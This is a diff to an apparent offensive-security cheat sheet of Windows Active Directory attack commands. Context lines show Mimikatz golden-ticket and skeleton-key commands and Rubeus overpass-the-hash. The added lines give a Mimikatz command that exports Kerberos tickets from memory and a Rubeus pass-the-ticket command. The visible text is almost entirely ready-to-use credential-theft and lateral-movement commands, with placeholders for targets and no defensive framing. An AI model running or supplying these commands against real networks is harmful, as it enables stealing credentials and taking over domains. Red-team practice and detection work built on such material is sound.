@@ -154,6 +154,10 @@ C:> Invoke-Mimikatz -Command '0"kerberos::golden /User:Administrator /domain:<do
 # To run on DC. Allows init session with password mimikatz
 C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 ```
+##### Export Tickets
+```powershell
+C:> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"' 
+```
 ### Rubeus
 ---
 ##### OverPass The Hash
@@ -161,4 +165,8 @@ C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 C:> Rubeus.exe asktgt /user:<username> /aes256:<aes256_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 C:> Rubeus.exe asktgt /user:<username> /ntlm:<ntlm_rc4_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
+```
+##### Pass the Ticket
+```powershell
+C:> Rubeus.exe ptt /ticket:<base64_TGT>
 ```
